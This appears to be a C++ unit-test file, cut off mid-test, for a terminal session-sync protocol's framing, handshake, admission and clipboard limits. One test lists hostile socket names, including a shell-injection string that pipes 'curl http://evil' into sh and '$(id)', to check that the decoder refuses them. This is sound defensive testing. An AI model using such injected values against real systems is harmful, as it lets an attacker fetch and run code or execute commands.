// Copyright (C) 2026 Stanislav Yaglo
// SPDX-License-Identifier: Apache-2.0

#include "Core/Attributes/Hyperlinks.h"
#include "Core/Rendering/StatusRow.h"
#include "Core/Screen/Addressing.h"
#include "Core/Screen/Scrollback.h"
#include "Core/Screen/SizedBlock.h"
#include "Harness.h"
#include "ScreenPlaneFixture.h"

// Canonical transport framing, admission, client refusal and typed presentation.

#include "Core/CellGrid.h"
#include "Core/CellPen.h"
#include "Core/Codec/ZlibDeflate.h"
#include "Core/Codec/ZlibInflate.h"
#include "Core/Image/ImagePlacement.h"
#include "Core/Network/RemoteLaunch.h"
#include "Core/Protocol/Control/CaptureReply.h"
#include "Core/Protocol/Control/SessionTermination.h"
#include "Core/Protocol/Sync/Control.h"
#include "Core/Protocol/Sync/FrameIngress.h"
#include "Core/Protocol/Sync/NativeAttachment.h"
#include "Core/Protocol/Sync/SyncClientCore.h"
#include "Core/Protocol/Sync/Wire.h"
#include "Core/Rendering/ImageQuads.h"
#include "Core/Selection/TerminalSelection.h"
#include "Core/Session/HostListing.h"
#include "Core/Terminal.h"
#include "Core/TerminalOperations.h"

#include <algorithm>
#include <array>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <span>
#include <string>
#include <vector>

using namespace Ubiquitty;
using namespace Ubiquitty::Protocol::Sync;
namespace Sync = Ubiquitty::Protocol::Sync;

// ---- helpers ---------------------------------------------------------

static Sync::Greet greetingFixture()
{
    Sync::Greet greeting;
    greeting.wireVersion = Sync::wireVersion;
    greeting.appVersion = "1.2.3";
    greeting.clientInstance = { 3, 4 };
    greeting.clientKind = Sync::ClientKind::Human;
    greeting.facts.viewportColumns = 80;
    greeting.facts.viewportRows = 24;
    return greeting;
}

static Sync::Welcome welcomeFixture(std::uint32_t sessionID = 7, std::uint64_t daemonInstanceID = 9)
{
    Sync::Welcome welcome;
    welcome.wireVersion = Sync::wireVersion;
    welcome.appVersion = "1.2.3";
    welcome.hostInstanceID = { daemonInstanceID, 1 };
    welcome.attachmentID = { 3, 4 };
    welcome.resumeSecret = { 5, 6 };
    welcome.selection = { .target = Sync::AdmissionTarget::Session,
        .sessionID = sessionID,
        .workspaceID = 0,
        .daemonInstanceID = daemonInstanceID,
        .socketName = "fixture.sock",
        .buildFlags = localHostBuildFlags().toRaw(),
        .hostPlatform = "fixture" };
    return welcome;
}

template<typename Message>
static std::vector<std::uint8_t> canonicalBody(const Message& message)
{
    std::vector<std::uint8_t> body;
    Sync::encode(body, message);
    return body;
}

static std::vector<std::uint8_t> canonicalFrame(Sync::FrameKind kind, std::span<const std::uint8_t> body, std::uint32_t channel = 0)
{
    std::vector<std::uint8_t> frame;
    CHECK(Sync::appendFrame(frame, kind, channel, body));
    return frame;
}

static void greetCore(SyncClientCore& core)
{
    core.setClock([] { return 1; });
    core.setClientInstance({ 3, 4 });
    std::vector<std::uint8_t> greeting;
    core.buildHello(HandshakeRequest {}, greeting);
    CHECK(!greeting.empty());
}

static bool welcomeCore(SyncClientCore& core)
{
    greetCore(core);
    const auto frame = canonicalFrame(Sync::FrameKind::Welcome, canonicalBody(welcomeFixture()));
    return core.feed(std::as_bytes(std::span(frame)));
}

static Sync::FrameHeaderDecision admitCanonicalHeader(std::span<const std::uint8_t> bytes)
{
    Sync::FrameHeader header;
    Sync::EnvelopeError error = Sync::EnvelopeError::None;
    switch (Sync::readFrameHeader(bytes, header, error)) {
    case Sync::FrameHeaderState::NeedsMore:
        return {};
    case Sync::FrameHeaderState::Failed:
        return { .state = Sync::FrameHeaderDecision::State::Refused };
    case Sync::FrameHeaderState::Complete:
        return { .state = Sync::FrameHeaderDecision::State::Admitted, .bodyBytes = header.bodyBytes };
    }
    return { .state = Sync::FrameHeaderDecision::State::Refused };
}

static Session::TreeWorkspace listingWorkspaceFixture()
{
    Session::TreeWorkspace workspace;
    workspace.id = 5;
    workspace.revision = 7;
    workspace.name = "ubiquitty";
    Session::TreeWindow window;
    window.id = Session::Layout::SurfaceID { 9 };
    window.label = "main";
    Session::TreeTab tab;
    tab.id = Session::Layout::TabID { 10 };
    tab.name = "Tab — 日本語";
    Session::TreePane pane;
    pane.id = Session::Layout::PaneID { 11 };
    pane.sessionID = 7;
    pane.sessionLabel = "build";
    pane.label = "logs";
    pane.attendees = { { 1, Session::TreeAttendeeKind::Person }, { 2, Session::TreeAttendeeKind::Person }, { 3, Session::TreeAttendeeKind::Agent } };
    tab.panes.push_back(std::move(pane));
    tab.split.paneID = { 17, 19 };
    tab.split.columns = 80;
    tab.split.rows = 24;
    tab.split.structuralGeneration = 7;
    window.tabs.push_back(std::move(tab));
    workspace.windows.push_back(std::move(window));
    return workspace;
}

TEST(testFrameRoundtripEachType)
{
    auto greet = greetingFixture();
    greet.facts.viewportColumns = 120;
    greet.facts.viewportRows = 40;
    std::vector<std::uint8_t> wire;
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Greet, 0, canonicalBody(greet)));
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Welcome, 0, canonicalBody(welcomeFixture(0x12345678u))));
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Probe, 0, canonicalBody(Sync::Probe { .time = 0x0A0B0C0Du })));
    const auto credit = canonicalBody(Sync::Notify { .kind = Sync::NotifyKind::PasteReady, .record = { 'a', 'b' } });
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Notify, 0, credit));
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Bye, 0, canonicalBody(Sync::Bye {})));
    Sync::FrameDecoder decoder;
    decoder.append(wire);
    auto frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Greet);
    const auto greeting = Sync::decodeGreet(frame->body);
    CHECK(greeting && greeting->facts.viewportColumns == 120 && greeting->facts.viewportRows == 40);
    frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Welcome);
    const auto welcome = Sync::decodeWelcome(frame->body);
    CHECK(welcome && welcome->selection.sessionID == 0x12345678u);
    frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Probe);
    const auto probe = Sync::decodeProbe(frame->body);
    CHECK(probe && probe->time == 0x0A0B0C0Du);
    frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Notify);
    const auto notification = Sync::decodeNotifyHead(frame->body);
    CHECK(notification && notification->kind == std::to_underlying(Sync::NotifyKind::PasteReady) && notification->record.size() == 2);
    frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Bye);
    CHECK(Sync::decodeBye(frame->body));
    CHECK(!decoder.next());
    CHECK(decoder.error() == Sync::EnvelopeError::None);
    CHECK_EQ(decoder.bufferedBytes(), 0u);
}

TEST(canonicalFrameNamesRemainStableAcrossUnknownLookups)
{
    CHECK(std::strcmp(Sync::frameKindName(0x9D), "0x9D") == 0);
    CHECK(std::strcmp(Sync::frameKindName(35), "0x23") == 0);
    CHECK(std::strcmp(Sync::frameKindName(std::to_underlying(Sync::FrameKind::ClipboardData)), "ClipboardData") == 0);
    const char* a = Sync::frameKindName(0x7A);
    const char* b = Sync::frameKindName(0x5B);
    for (unsigned t = 0xE0; t <= 0xEF; ++t)
        (void)Sync::frameKindName(static_cast<uint8_t>(t));
    CHECK(std::strcmp(a, "0x7A") == 0);
    CHECK(std::strcmp(b, "0x5B") == 0);
    CHECK(a != b);
}

TEST(testPartialByteAtATime)
{
    auto greeting = greetingFixture();
    greeting.request.sessionID = 7;
    greeting.request.isAttachOnly = true;
    auto wire = canonicalFrame(Sync::FrameKind::Greet, canonicalBody(greeting));
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Notify, 0, canonicalBody(Sync::Notify { .kind = Sync::NotifyKind::Events, .record = { 'a', 'b', 'c' } })));
    Sync::FrameDecoder decoder;
    int got = 0;
    std::string seenTitle;
    for (const auto byte : wire) {
        decoder.append(std::span(&byte, 1));
        while (const auto frame = decoder.next()) {
            ++got;
            if (frame->kind == Sync::FrameKind::Greet) {
                const auto decoded = Sync::decodeGreet(frame->body);
                CHECK(decoded && decoded->facts.viewportColumns == 80 && decoded->facts.viewportRows == 24 && decoded->request.sessionID == 7);
            } else if (frame->kind == Sync::FrameKind::Notify) {
                const auto decoded = Sync::decodeNotifyHead(frame->body);
                REQUIRE(decoded);
                seenTitle.assign(decoded->record.begin(), decoded->record.end());
            }
        }
    }
    CHECK(got == 2);
    CHECK(seenTitle == "abc");
    CHECK(decoder.error() == Sync::EnvelopeError::None);
}

TEST(testPartialHeaderSplit)
{
    const auto wire = canonicalFrame(Sync::FrameKind::Probe, canonicalBody(Sync::Probe { .time = 132 }));
    Sync::FrameDecoder decoder;
    decoder.append(std::span(wire).first(2));
    CHECK(!decoder.next());
    decoder.append(std::span(wire).subspan(2));
    const auto frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Probe);
    const auto decoded = Sync::decodeProbe(frame->body);
    CHECK(decoded && decoded->time == 132);
    CHECK(!decoder.next());
}

TEST(testBackToBackInOneBuffer)
{
    std::vector<uint8_t> wire;
    for (std::uint64_t index = 0; index < 5; ++index)
        REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Probe, 0, canonicalBody(Sync::Probe { .time = index })));
    Sync::FrameDecoder decoder;
    decoder.append(wire);
    for (std::uint64_t index = 0; index < 5; ++index) {
        const auto frame = decoder.next();
        REQUIRE(frame && frame->kind == Sync::FrameKind::Probe);
        const auto decoded = Sync::decodeProbe(frame->body);
        CHECK(decoded && decoded->time == index);
    }
    CHECK(!decoder.next());
}

TEST(testDecoderFaultOnOverlong)
{
    std::vector<std::uint8_t> wire;
    Sync::WireWriter writer(wire);
    writer.u8(std::to_underlying(Sync::FrameKind::Notify));
    writer.varint(0);
    writer.varint(Sync::maxFrameBodyBytes + 1);
    Sync::FrameDecoder decoder;
    decoder.append(wire);
    CHECK(!decoder.next());
    CHECK(decoder.error() == Sync::EnvelopeError::Oversize);
    decoder.append(canonicalFrame(Sync::FrameKind::Probe, canonicalBody(Sync::Probe {})));
    CHECK(!decoder.next());
    CHECK(decoder.error() == Sync::EnvelopeError::Oversize);
}

// A host reading a client takes no frame longer than a client may send: a
// header that declares one byte more faults the decoder before any of the
// body is held, and one at the ceiling is still a frame to wait for.
TEST(aDecoderForAClientRefusesAFrameOneByteOverAtItsHeader)
{
    const auto header = [](std::size_t length) {
        std::vector<std::uint8_t> bytes;
        Sync::WireWriter writer(bytes);
        writer.u8(std::to_underlying(Sync::FrameKind::Notify));
        writer.varint(0);
        writer.varint(length);
        return bytes;
    };
    Sync::FrameIngress over(Sync::maxFrameBodyBytes);
    unsigned delivered = 0;
    const auto receive = [&](auto, auto) { ++delivered; return Sync::FrameDelivery::Continue; };
    const auto refused = over.consume(header(Sync::maxFrameBodyBytes + 1), admitCanonicalHeader, receive);
    CHECK(refused.state == Sync::FrameIngress::State::Refused);
    CHECK_EQ(over.retainedBytes(), 0u);
    CHECK_EQ(delivered, 0u);
    Sync::FrameIngress at(Sync::maxFrameBodyBytes);
    const auto accepted = at.consume(header(Sync::maxFrameBodyBytes), admitCanonicalHeader, receive);
    CHECK(accepted.state == Sync::FrameIngress::State::Accepting);
    CHECK_EQ(delivered, 0u);
    const std::vector<std::uint8_t> body(Sync::maxFrameBodyBytes, 0x20);
    CHECK(at.consume(body, admitCanonicalHeader, receive).state == Sync::FrameIngress::State::Accepting);
    CHECK_EQ(delivered, 1u);
}

// A direct stream is a sequence of bounded envelopes, not an opaque byte run
// sliced into another transport's frames.
TEST(aCanonicalStreamCarriesSeveralBoundedFramesWithoutAnOuterWrapper)
{
    std::vector<uint8_t> wire;
    std::vector<std::uint8_t> expected;
    for (const auto length : { Sync::maxFrameBodyBytes, Sync::maxFrameBodyBytes, std::size_t { 1000 } }) {
        const std::vector<std::uint8_t> body(length, 0x20);
        REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Notify, 0, body));
        expected.insert(expected.end(), body.begin(), body.end());
    }
    Sync::FrameDecoder decoder;
    decoder.append(wire);
    std::vector<std::size_t> lengths;
    std::vector<uint8_t> carried;
    while (const auto frame = decoder.next()) {
        CHECK(frame->kind == Sync::FrameKind::Notify);
        lengths.push_back(frame->body.size());
        carried.insert(carried.end(), frame->body.begin(), frame->body.end());
    }
    CHECK(decoder.error() == Sync::EnvelopeError::None);
    CHECK(lengths == (std::vector<std::size_t> { Sync::maxFrameBodyBytes, Sync::maxFrameBodyBytes, 1000 }));
    CHECK(carried == expected);
    const auto before = wire;
    CHECK(!Sync::appendFrame(wire, Sync::FrameKind::Notify, 0, std::vector<std::uint8_t>(Sync::maxFrameBodyBytes + 1)));
    CHECK(wire == before);
}

TEST(testDecoderRetainedCapacity)
{
    const std::vector<std::uint8_t> body(Sync::maxFrameBodyBytes, 'x');
    const auto wire = canonicalFrame(Sync::FrameKind::Notify, body);
    unsigned delivered = 0;
    const auto receive = [&](auto, std::span<const std::uint8_t> received) {
        ++delivered;
        CHECK(received.size() == body.size());
        return Sync::FrameDelivery::Continue;
    };
    Sync::FrameIngress ingress(Sync::maxFrameBodyBytes);
    CHECK(ingress.consume(wire, admitCanonicalHeader, receive).state == Sync::FrameIngress::State::Accepting);
    CHECK_EQ(delivered, 1u);
    CHECK_EQ(ingress.pendingBytes(), 0u);
    CHECK_EQ(ingress.retainedBytes(), body.size());
    ingress.releaseRetained();
    CHECK_EQ(ingress.retainedBytes(), 0u);
    Sync::FrameIngress partial(Sync::maxFrameBodyBytes);
    const auto prefix = std::span(wire).first(wire.size() - body.size() + 4096);
    CHECK(partial.consume(prefix, admitCanonicalHeader, receive).state == Sync::FrameIngress::State::Accepting);
    const auto pending = partial.pendingBytes();
    partial.releaseRetained();
    CHECK_EQ(partial.pendingBytes(), pending);
    CHECK_EQ(partial.retainedBytes(), body.size());
    CHECK_EQ(delivered, 1u);
    CHECK(partial.consume(std::span(wire).subspan(prefix.size()), admitCanonicalHeader, receive).state == Sync::FrameIngress::State::Accepting);
    CHECK_EQ(delivered, 2u);
}

TEST(testTypedDecodeShortPayload)
{
    std::printf("testTypedDecodeShortPayload\n");
    uint8_t tooShort[3] = { 1, 0, 2 };
    CHECK(!Sync::decodeGreet({ tooShort, sizeof(tooShort) }));
    CHECK(!Sync::decodeWelcome({ tooShort, sizeof(tooShort) }));
    CHECK(!Sync::decodeProbe({ tooShort, sizeof(tooShort) }));
}

TEST(canonicalGreetingAndWelcomeRefuseEveryTruncation)
{
    auto greet = greetingFixture();
    greet.request.target = Sync::AdmissionTarget::Workspace;
    greet.request.servesClipboard = true;
    greet.request.agentLabel = "agent-x";
    greet.credential = std::vector<std::uint8_t> { 't', 'o', 'k' };
    const auto greeting = canonicalBody(greet);
    const auto decoded = Sync::decodeGreet(greeting);
    REQUIRE(decoded);
    CHECK(decoded->request.target == Sync::AdmissionTarget::Workspace);
    CHECK(decoded->request.servesClipboard && decoded->request.agentLabel == "agent-x");
    CHECK(decoded->credential == greet.credential);
    for (std::size_t cut = 0; cut < greeting.size(); ++cut)
        CHECK(!Sync::decodeGreet(std::span(greeting).first(cut)));
    auto welcome = welcomeFixture(0x12345678u);
    welcome.selection.socketName = "host-abc123.sock";
    const auto body = canonicalBody(welcome);
    const auto accepted = Sync::decodeWelcome(body);
    REQUIRE(accepted);
    CHECK(accepted->selection.socketName == "host-abc123.sock");
    for (std::size_t cut = 0; cut < body.size(); ++cut)
        CHECK(!Sync::decodeWelcome(std::span(body).first(cut)));
}

TEST(everyCanonicalAdmissionRefusalRetainsItsReasonAndBuild)
{
    for (const auto reason : { Sync::ByeReason::TokenMissing, Sync::ByeReason::TokenInvalid, Sync::ByeReason::TokenExpired,
             Sync::ByeReason::TokenRevoked, Sync::ByeReason::OutsideScope, Sync::ByeReason::VersionMismatch,
             Sync::ByeReason::DuplicateHandshake, Sync::ByeReason::NoConsent, Sync::ByeReason::RemoteHostRefused,
             Sync::ByeReason::SessionGone, Sync::ByeReason::HostFull }) {
        const auto refusal = Sync::spokenBye(Sync::wireVersion, "1.2.3", "fixture", reason, "refused");
        const auto decoded = Sync::decodeBye(canonicalBody(refusal));
        REQUIRE(decoded && decoded->peer);
        CHECK(decoded->reason == reason);
        CHECK(Sync::isRefusal(decoded->reason));
        CHECK(decoded->peer->build.appVersion == "1.2.3");
        CHECK(decoded->peer->platform == "fixture");
    }
    auto unknown = canonicalBody(Sync::Bye {});
    unknown.front() = 0xFF;
    CHECK(!Sync::decodeBye(unknown));
}

TEST(testHandshakeDecodesBackToBack)
{
    auto greet = greetingFixture();
    greet.facts.viewportColumns = 100;
    greet.facts.viewportRows = 30;
    auto wire = canonicalFrame(Sync::FrameKind::Greet, canonicalBody(greet));
    REQUIRE(Sync::appendFrame(wire, Sync::FrameKind::Welcome, 0, canonicalBody(welcomeFixture(0xABCDu))));
    Sync::FrameDecoder decoder;
    decoder.append(wire);
    auto frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Greet);
    const auto greeting = Sync::decodeGreet(frame->body);
    CHECK(greeting && greeting->facts.viewportColumns == 100 && greeting->facts.viewportRows == 30);
    frame = decoder.next();
    REQUIRE(frame && frame->kind == Sync::FrameKind::Welcome);
    const auto welcome = Sync::decodeWelcome(frame->body);
    CHECK(welcome && welcome->selection.sessionID == 0xABCDu);
    const std::array<std::uint8_t, 10> legacy { static_cast<std::uint8_t>(Sync::wireVersion), 0, 80, 0, 24, 0, 0, 0, 0, 0 };
    CHECK(!Sync::decodeGreet(legacy));
}

TEST(testAgentFramesRoundtrip)
{
    {
        Ubiquitty::Protocol::Sync::PaneFacts facts;
        facts.revision = 7;
        facts.isAtPrompt = true;
        facts.foreground.name = "zsh";
        std::vector<uint8_t> wire;
        Ubiquitty::Protocol::Sync::encodePaneFacts(wire, facts);
        const auto outDecoded = Ubiquitty::Protocol::Sync::decodePaneFacts(wire);
        CHECK(outDecoded.has_value());
        CHECK(outDecoded && *outDecoded == facts);
    }
    // A capture preserves its requested range and exact correlation, not a
    // retired RegionData body with a second request identifier.
    {
        namespace Control = Ubiquitty::Protocol::Control;
        const Control::CaptureTarget target { .pane = 7, .request = { .source = Control::CaptureSource::Rows, .start = -3, .end = 100 } };
        const auto body = canonicalBody(Sync::Result { .transfer = 0,
            .text = R"({"jsonrpc":"2.0","id":"capture.9","result":{"pane":7,"source":"rows","first":0,"last":100,"totalRows":101,"columns":80,"complete":true,"text":"line1\nline2\n"}})" });
        const auto result = Sync::decodeResult(body);
        REQUIRE(result && result->transfer == 0);
        bool isJSON = false;
        const auto response = Codec::JSON::parse(result->text, isJSON);
        REQUIRE(isJSON);
        const auto capture = Control::decodeCaptureReply(response, "capture.9", target);
        CHECK(capture.status == Control::CaptureReplyStatus::Complete);
        CHECK(capture.text == "line1\nline2\n");
        CHECK(Control::decodeCaptureReply(response, "capture.other", target).status == Control::CaptureReplyStatus::Unrelated);
        const auto cut = Sync::decodeResult(std::span(body).first(body.size() - 1));
        REQUIRE(cut);
        (void)Codec::JSON::parse(cut->text, isJSON);
        CHECK(!isJSON);
    }
    const auto listing = Sync::decodeCallRequest(Session::HostListing::subscribeRequest("listing.33"));
    CHECK(listing.outcome == Protocol::Control::RequestOutcome::Dispatch);
    CHECK(listing.method == "host.sessions.subscribe");
    CHECK(listing.id.isString() && listing.id.asString() == "listing.33");
    const auto termination = Sync::decodeCallRequest(Protocol::Control::terminationRequest(88, "terminate.5"));
    CHECK(termination.outcome == Protocol::Control::RequestOutcome::Dispatch);
    CHECK(termination.method == "session.terminate");
    CHECK(termination.params.numberOr("session") == 88);
}

TEST(canonicalAdmissionCarriesBinaryCredentialsAndTypedRefusal)
{
    const auto refusal = Sync::decodeBye(canonicalBody(Sync::Bye { .reason = Sync::ByeReason::OutsideScope, .detail = {} }));
    CHECK(refusal && refusal->reason == Sync::ByeReason::OutsideScope);
    auto greeting = greetingFixture();
    greeting.request.agentLabel = "claude-code";
    greeting.credential = std::vector<std::uint8_t> { 1, 2, 't', 'o', 'k', 0, 's', 'e', 'c', 'r', 'e', 't' };
    const auto decoded = Sync::decodeGreet(canonicalBody(greeting));
    REQUIRE(decoded);
    CHECK(decoded->request.agentLabel == greeting.request.agentLabel);
    CHECK(decoded->credential == greeting.credential);
}

TEST(canonicalWelcomeRefusesUnsafeSocketBasenames)
{
    auto welcome = welcomeFixture();
    welcome.selection.socketName = "host-abc123.sock";
    const auto decoded = Sync::decodeWelcome(canonicalBody(welcome));
    CHECK(decoded && decoded->selection.socketName == "host-abc123.sock");
    const char* hostile[] = { "\";curl http://evil|sh;\"", "a b", "$(id)", "a`id`", "../x", "a;b", "a'b" };
    for (const char* name : hostile) {
        welcome.selection.socketName.assign(std::strlen(name), 'x');
        auto body = canonicalBody(welcome);
        REQUIRE(Sync::decodeWelcome(body));
        Sync::WireReader prefix(body);
        (void)prefix.u16();
        (void)prefix.utf8(Sync::maxAppVersionBytes);
        (void)prefix.take(32 + 16 * 3 + 1 + 1 + 4 + 4 + 8);
        const auto length = prefix.varint(Sync::maxDaemonSocketNameBytes);
        REQUIRE(prefix.ok() && length == std::strlen(name));
        std::copy_n(name, length, body.begin() + static_cast<std::ptrdiff_t>(prefix.offset()));
        CHECK(!Sync::decodeWelcome(body));
        welcome.selection.socketName = name;
        CHECK(canonicalBody(welcome).empty());
    }
}

TEST(testBuiltFramesAppendRatherThanReplace)
{
    std::printf("testBuiltFramesAppendRatherThanReplace\n");

    // The wire is a stream of frames, not a slot holding one. A caller building
    // two into a single buffer gets both, in order — so accumulating before a
    // single write is correct, and a caller that expects the second to replace
    // the first would silently send the pair.
    std::vector<uint8_t> buffer;
    REQUIRE(Sync::appendFrame(buffer, Sync::FrameKind::Greet, 0, canonicalBody(greetingFixture())));
    const std::size_t afterFirst = buffer.size();
    CHECK(afterFirst > 0);

    std::vector<std::uint8_t> factsBody;
    Sync::encode(factsBody, Sync::Facts {});
    REQUIRE(Sync::appendFrame(buffer, Sync::FrameKind::Facts, 0, factsBody));
    CHECK(buffer.size() > afterFirst);

    Sync::FrameDecoder decoder;
    decoder.append(buffer);
    auto frame = decoder.next();
    CHECK(frame && frame->kind == Sync::FrameKind::Greet);
    frame = decoder.next();
    CHECK(frame && frame->kind == Sync::FrameKind::Facts);
    CHECK(!decoder.next());
}

// A host says what the compiler did to it, because an unoptimised daemon is
// indistinguishable from a slow one across the wire.
//
TEST(canonicalWelcomeCarriesExplicitHostBuildFlagsWithoutUnknownBits)
{
    auto sent = welcomeFixture();
    const auto body = canonicalBody(sent);
    const auto decoded = Sync::decodeWelcome(body);
    REQUIRE(decoded);
    CHECK_EQ(decoded->selection.buildFlags, localHostBuildFlags().toRaw());
    CHECK(HostBuildFlags::fromRaw(decoded->selection.buildFlags).contains(HostBuildFlag::AssertionsEnabled));
    SyncClientCore core(nullptr, nullptr);
    greetCore(core);
    const auto frame = canonicalFrame(Sync::FrameKind::Welcome, body);
    REQUIRE(core.feed(std::as_bytes(std::span(frame))));
    CHECK(core.hostBuildFlags() == localHostBuildFlags());
    sent.selection.buildFlags = 4;
    CHECK(canonicalBody(sent).empty());
    CHECK(!Sync::decodeWelcome(std::span(body).first(body.size() - 1)));
}

// A pane keeps the identity the instance that started its session gave it,
// across a handover: a successor's tree names a session's pane under the
// holder's instance, and the client binds that pane for the session rather
// than one it assumes under the instance that answered. A pane it already
// knows for a session is kept.
TEST(aSessionsPaneIsTheOneTheHostsTreeNames)
{
    Ubiquitty::Terminal term;
    SyncClientCore core(&term, nullptr);
    REQUIRE(welcomeCore(core));
    TopologyTree tree;
    tree.revision = 1;
    TopologyNode handedOver;
    handedOver.paneID = { .low = 7, .high = 5 };
    tree.root.children = { handedOver };
    core.noteTopology(tree);
    const auto bind = canonicalFrame(Sync::FrameKind::PaneBind, canonicalBody(Sync::PaneBind { .handle = 1, .paneID = { 7, 5 } }));
    REQUIRE(core.feed(std::as_bytes(std::span(bind))));
    const std::optional<ID128> handedOverIdentity = ID128 { .low = 7, .high = 5 };
    CHECK(core.boundPaneIdentity(7) == handedOverIdentity);
    TopologyTree later;
    later.revision = 2;
    TopologyNode renamed;
    renamed.paneID = { .low = 7, .high = 29 };
    later.root.children = { renamed };
    core.noteTopology(later);
    CHECK(core.boundPaneIdentity(7) == handedOverIdentity);
}

// Every canonical kind has a distinct name, not merely an unknown-byte hex
// spelling. Unknown names remain in immutable storage a logger may retain.
TEST(everyCanonicalFrameKindNamesItselfDistinctly)
{
    for (unsigned raw = 0; raw <= 0xFF; ++raw) {
        if (!Sync::frameKindOf(static_cast<std::uint8_t>(raw)))
            continue;
        const char* name = Sync::frameKindName(static_cast<std::uint8_t>(raw));
        REQUIRE(name && name[0] != '\0');
        CHECK(std::strncmp(name, "0x", 2) != 0);
        for (unsigned other = raw + 1; other <= 0xFF; ++other) {
            if (Sync::frameKindOf(static_cast<std::uint8_t>(other)))
                CHECK(std::strcmp(name, Sync::frameKindName(static_cast<std::uint8_t>(other))) != 0);
        }
    }
    // An unknown tag: the hex form, from immutable storage — the same pointer
    // every call, so a logger may keep it.
    const char* unknown = Sync::frameKindName(0x7B);
    CHECK(std::strcmp(unknown, "0x7B") == 0);
    CHECK(unknown == Sync::frameKindName(0x7B));
}

// These are domain values shared by the clipboard adapter, not raw Sync codecs.
TEST(testClipboardDomainResponsePreservesBinaryItems)
{
    const std::vector<ClipboardServeItem> items {
        { "image/png", { 0x89, 'P', 'N', 'G', 0, 0xff } },
        { "text/plain", {} }
    };
    const auto message = makeClipboardData(91, ClipboardServeStatus::OK, items);
    CHECK_EQ(message.requestID, 91u);
    CHECK(message.status == ClipboardServeStatus::OK);
    REQUIRE(message.items.size() == items.size());
    for (std::size_t index = 0; index < items.size(); ++index) {
        CHECK(message.items[index].mime == items[index].mime);
        CHECK(message.items[index].data == items[index].data);
    }
}

TEST(testClipboardDomainResponseBoundsAggregateBytes)
{
    std::vector<ClipboardServeItem> items {
        { "image/png", std::vector<std::uint8_t>(maxClipboardServeBytes / 2, 0x42) },
        { "image/tiff", std::vector<std::uint8_t>(maxClipboardServeBytes / 2, 0x43) }
    };
    const auto maximum = makeClipboardData(92, ClipboardServeStatus::OK, items);
    CHECK(maximum.status == ClipboardServeStatus::OK);
    REQUIRE(maximum.items.size() == 2);
    CHECK_EQ(maximum.items[0].data.size() + maximum.items[1].data.size(), maxClipboardServeBytes);
    items[1].data.push_back(0x44);
    const auto tooLarge = makeClipboardData(93, ClipboardServeStatus::OK, std::move(items));
    CHECK_EQ(tooLarge.requestID, 93u);
    CHECK(tooLarge.status == ClipboardServeStatus::TooLarge);
    CHECK(tooLarge.items.empty());
}

TEST(testClipboardDomainRefusalsNeverCarryItems)
{
    for (const auto status : { ClipboardServeStatus::Empty, ClipboardServeStatus::Refused, ClipboardServeStatus::TooLarge }) {
        const auto response = makeClipboardData(94, status, { { "text/plain", { 's', 'e', 'c', 'r', 'e', 't' } } });
        CHECK_EQ(response.requestID, 94u);
        CHECK(response.status == status);
        CHECK(response.items.empty());
    }
}

TEST(typedWorkspaceStructureAdmitsItsNameBoundAndRefusesLargerDeclaredText)
{
    CHECK_EQ(maxWorkspaceNameLength, 4096u);
    auto workspace = listingWorkspaceFixture();
    workspace.name.assign(maxWorkspaceNameLength, 'w');
    std::vector<std::uint8_t> body;
    REQUIRE(Session::encodeWorkspaceStructure(body, workspace));
    const auto decoded = Session::decodeWorkspaceStructure(body);
    REQUIRE(decoded);
    CHECK(decoded->name == workspace.name);

    // Build the current prefix through its declared name length and stop
    // there: an oversized declaration must fail before any allocation or
    // later structure field is read, so no later field is needed.
    std::vector<std::uint8_t> oversized;
    Sync::WireWriter writer(oversized);
    writer.u64(workspace.revision);
    writer.u8(std::to_underlying(workspace.state));
    writer.u8(0);
    writer.u32(workspace.id);
    writer.varint(maxWorkspaceNameLength + 1);
    CHECK(!Session::decodeWorkspaceStructure(oversized));
}

TEST(canonicalGreetingAdmitsTheWorkspaceByteBoundAndBoundsPresentation)
{
    auto greeting = greetingFixture();
    greeting.request.workspaceName.assign(maxWorkspaceNameLength, 'w');
    greeting.request.agentLabel.assign(maxWorkspaceNameLength + 1, 'a');
    const auto atBound = Sync::decodeGreet(canonicalBody(greeting));
    REQUIRE(atBound);
    CHECK(atBound->request.workspaceName == greeting.request.workspaceName);
    CHECK(atBound->request.agentLabel == std::string(Sync::maxAgentLabelBytes, 'a'));
    greeting.request.workspaceName.push_back('w');
    CHECK(canonicalBody(greeting).empty());
}

TEST(canonicalNamedWorkspaceGreetingRefusesEveryTruncation)
{
    auto greeting = greetingFixture();
    greeting.request.workspaceName = "ubiquitty";
    greeting.request.endsWhenDetached = true;
    const auto body = canonicalBody(greeting);
    const auto whole = Sync::decodeGreet(body);
    REQUIRE(whole);
    CHECK(whole->request.workspaceName == "ubiquitty");
    CHECK(whole->request.endsWhenDetached);
    std::size_t refused = 0;
    for (std::size_t cut = 1; cut < body.size(); ++cut) {
        if (!Sync::decodeGreet(std::span(body).first(cut)))
            ++refused;
    }
    CHECK_EQ(refused, body.size() - 1);
}

TEST(canonicalCaptureTextIsWholeAndLargeResultsRequireBulk)
{
    namespace Control = Ubiquitty::Protocol::Control;
    using Codec::JSON::Value;
    const std::string text = std::string(69'999, 'r') + '\n';
    auto result = Value::object();
    result.set("pane", Value::number(7));
    result.set("source", Value::string("rows"));
    result.set("first", Value::number(0));
    result.set("last", Value::number(1000));
    result.set("totalRows", Value::number(1001));
    result.set("columns", Value::number(80));
    result.set("complete", Value::boolean(true));
    result.set("text", Value::string(text));
    auto response = Value::object();
    response.set("jsonrpc", Value::string("2.0"));
    response.set("id", Value::string("capture.large"));
    response.set("result", std::move(result));
